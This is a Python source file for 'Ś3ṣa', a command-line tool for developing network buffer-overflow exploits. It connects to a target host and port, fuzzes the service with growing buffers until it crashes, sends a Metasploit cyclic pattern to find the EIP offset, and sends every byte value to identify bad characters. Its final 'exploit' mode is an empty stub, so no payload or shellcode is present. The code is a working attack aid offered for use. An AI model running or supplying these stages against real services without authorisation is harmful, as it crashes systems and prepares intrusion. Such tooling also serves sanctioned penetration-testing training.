#!/usr/bin/env python3

# Ś3ṣa: net BoF fuzz and exploit tool for py3
# https://en.wikipedia.org/wiki/Shesha

import argparse
import subprocess
import socket
import time

def get_banner():
    return (
"################################################################\n"
"#                ,---,                    .____                #\n"
"#       ___    ,(0---0),    ___       _/_ |_  /  ___  __ _     #\n"
"#      /   \  / /\   /\ \  /   \     / __| |_ \ / __|/ _` |    #\n"
"#     |0| |0\ \-  \_/  -/ /0| |0|    \__ \,__) )\__ \ (_| |    #\n"
"#      \__/.----/  ^  \----.\__/     |___/\___/ |___/\__,_|.py #\n"
"# (x10k)^ /   ,   \ /   ,   \ ^                    °           #\n"
"#        /  /`\   / \   /'\, \                                 #\n" 
"#   ___  `\ \  \-  |  -/  /`/'       network buffer-overflow   #\n"
"#  /   \  |`\\\\_)`-- --'(_//           fuzz & exploit assist    #\n"
"# |0| |0\ / | |_|`-- --'|_| _______                            #\n"
"#  \__/\____/,'`-   -'`.,-'/       `-.                         #\n"
"#            \---------/||            `-.      _,------.       #\n"
"#            \---------/`|    .--.       `----'   ___--.`--.   #\n"
"#             \---------/\. .\"    `.            ,'       `---' #\n"
"#             ``-._______.-'        `-._______.-'              #\n"
"################################################################\n")


def filler_type(value):
    if len(value) != 1 or ord(value) not in range(256):
        raise argparse.ArgumentTypeError('%s is not a valid char, choose value in range [\\x00 - \\xFF]' % value)
    return value


def hexchars_type(value_str):
    value = []
    chunk_size = 4
    chunks = [value_str[i:i+chunk_size] for i in range(0, len(value_str), chunk_size)]
    
    for x in chunks:
        if len(x) != 4 or x[:2] != '\\x':
            raise argparse.ArgumentTypeError('%s is not a valid list of hex chars, choose values with format \\x00' % value_str)

        value_int = int(x[2:], 16)
        value_chr = chr(value_int)
        value.append(value_chr)

    return value


def parse_args():
    print(get_banner())
    parser = argparse.ArgumentParser(prog='Ś3ṣa.py', formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    subparsers = parser.add_subparsers(title='sub-commands', required=True, metavar='MODE')
    add_fuzz_subparser(subparsers)
    add_offset_subparser(subparsers)
    add_badchars_subparser(subparsers)
    add_exploit_subparser(subparsers)
    
    add_global_parser(parser)
    parser.add_argument('target', help='target hostname or IP address', metavar='TARGET')
    parser.add_argument('port', help='target port', type=int, metavar='PORT')    

    return parser.parse_args()


def add_global_parser(parser):
    parser.add_argument('-t', '--timeout', help='connection timeout - in seconds', type=int, default=5)
    parser.add_argument('-d', '--delay', help='wait time between reply and next message - in seconds', type=int, default=1)
    parser.add_argument('-I', '--interactions', help='network messages sent previous to the payload', nargs='+', metavar='MSG', default=[])
    parser.add_argument('-p', '--prefix', help='prefix needed to trigger payload')
    parser.add_argument('-f', '--filler', help='char repeated to fill the buffer', type=filler_type, default='A')


def add_fuzz_subparser(subparsers):
    fuzz_parser = subparsers.add_parser('find-length', aliases=['fuzz'], help='for more options: fuzz -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    fuzz_parser.add_argument('-s', '--step', help='increase in buffer length per iteration', type=int, default=100)
    fuzz_parser.set_defaults(func=fuzz)


def add_offset_subparser(subparsers):
    offset_parser = subparsers.add_parser('find-offset', aliases=['eip'], help='for more options: eip -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    offset_parser.add_argument('-a', '--approx', help='approx buffer length that causes overflow - found using MODE=fuzz', type=int, required=True)
    offset_parser.add_argument('-c', '--cyclic', help='length of cyclic pattern used', type=int, default=100)
    offset_parser.set_defaults(func=find_offset)


def add_badchars_subparser(subparsers):
    badchars_parser = subparsers.add_parser('find-badchars', aliases=['bad'], help='for more options: bad -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    badchars_parser.add_argument('-o', '--offset', help='EIP offset - found using MODE=eip', type=int, required=True)
    badchars_parser.add_argument('-e', '--eip', help='char repeated to fill the EIP reg', type=filler_type, default='B')
    badchars_parser.add_argument('-b', '--badchars', help='Known badchars in hex (\\x00) string', type=hexchars_type, default=[])
    badchars_parser.set_defaults(func=find_badchars)


def add_exploit_subparser(subparsers):
    exploit_parser = subparsers.add_parser('exploit', aliases=['pwn'], help='for more options: pwn -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    exploit_parser.set_defaults(func=exploit)


def fuzz(args):
    overflow = ''
    buffer = ''
    try:
        while True:
            overflow += args.filler * args.step
            buffer = args.prefix + overflow
            print('Fuzzing with {} bytes (total {})'.format(len(overflow), len(buffer)))

            send(buffer, blocking=True)
            time.sleep(args.delay)
    except:
        print('[*] Fuzzing crashed at {} bytes (total {})'.format(len(overflow), len(buffer)))


def find_offset(args):
    overflow_len = args.approx - args.cyclic
    overflow = args.filler * overflow_len
    pattern = subprocess.run(['msf-pattern_create', '-l', str(args.cyclic)], capture_output=True, text=True).stdout
    
    buffer = args.prefix + overflow + pattern
    send(buffer)
    print('[*] Payload sent, look for pattern offset with mona.py: !mona findmsp -distance {}'.format(args.cyclic))
    print('[*] EIP = {} + mona_offset'.format(overflow_len))


def find_badchars(args):
    allchars = (
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    overflow = args.filler * args.offset
    ret_address = args.eip * 4
    badchars = "".join([x for x in allchars if x not in args.badchars])

    buffer = args.prefix + overflow + ret_address + badchars
    send(buffer)
    print('[*] Badchars sent, now compare them with mona.py')
    print('[*] Create bytearray: !mona bytearray -b "<badchars>"')
    print('[*] Compare it with memory: !mona compare -f <path>\\bytearray.bin -a <ESP>')


def exploit(args):
    return


def send(buffer, blocking=False):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        connect(s, args)
        s.send(bytes(buffer + '\r\n', 'latin-1'))

        if blocking:
            s.recv(1024)


def connect(s, args):
    s.settimeout(args.timeout)
    s.connect((args.target, args.port))
    s.recv(1024)


def test_connect(args):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
            connect(s, args)
            return True
    except:
        return False


args = parse_args()
if not test_connect(args):
    print('[!] Could not connect to the target ({}:{})'.format(args.target, args.port))
    exit(1)
else:
    args.func(args)
